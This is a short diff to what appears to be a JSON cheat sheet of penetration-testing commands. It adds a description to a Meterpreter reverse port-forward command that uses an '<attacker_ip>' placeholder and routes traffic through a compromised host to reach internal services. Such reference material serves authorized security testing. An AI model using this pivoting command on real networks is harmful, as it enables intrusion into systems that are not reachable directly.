@@ -58,7 +58,8 @@
   "variations": [
     {
       "label": "Reverse",
-      "command": "portfwd add -R -l <local_port> -p <remote_port> -L <attacker_ip>"
+      "command": "portfwd add -R -l <local_port> -p <remote_port> -L <attacker_ip>",
+      "description": "Creates a port forward through a Meterpreter session. Routes traffic through the compromised host to reach internal services that are not directly accessible."
     }
   ],
   "recommended": [
